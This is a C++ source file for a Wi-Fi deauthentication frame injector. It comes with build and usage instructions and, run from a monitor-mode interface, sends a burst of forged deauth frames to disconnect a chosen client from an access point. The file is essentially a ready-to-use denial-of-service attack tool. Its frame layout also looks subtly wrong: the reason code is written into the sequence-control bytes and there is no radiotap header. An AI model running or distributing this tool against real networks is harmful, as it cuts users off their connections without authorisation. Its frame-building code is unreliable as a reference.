// ============================================================
// deauth.cpp — 802.11 deauthentication frame injector
// ------------------------------------------------------------
// Compile: clang++ -std=c++17 -O2 -o deauth deauth.cpp \
//          -I/opt/homebrew/include -L/opt/homebrew/lib \
//          -lPcap++ -lPacket++ -lCommon++ -lpcap
// Usage:   sudo ./deauth <iface> <bssid> <client>
// Note:    Interface must be in monitor mode:
//          sudo ifconfig en0 down; sudo ifconfig en0 monitor up
// ============================================================
#include "PcapLiveDeviceList.h"
#include "Packet.h"
#include "RawPacket.h"
#include <cstdio>
#include <cstring>
#include <unistd.h>

int main(int argc, char** argv) {
    if (argc < 4) return 1;
    auto* dev = pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByName(argv[1]);
    if (!dev || !dev->open()) return 1;

    uint8_t bssid[6], client[6];
    sscanf(argv[2], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
        &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
    sscanf(argv[3], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
        &client[0], &client[1], &client[2], &client[3], &client[4], &client[5]);

    uint8_t frame[26] = {
        0xC0, 0x00, 0x00, 0x00,
    };
    memcpy(frame + 4, client, 6);
    memcpy(frame + 10, bssid, 6);
    memcpy(frame + 16, bssid, 6);
    frame[22] = 0x01; frame[23] = 0x00; // reason: unspecified
    for (int i = 0; i < 10; i++) {
        pcpp::RawPacket raw(frame, sizeof(frame), timeval{0,0}, false);
        dev->sendPacket(&raw);
        usleep(100000);
    }
    std::printf("[+] deauth frames sent\n");
    return 0;
}
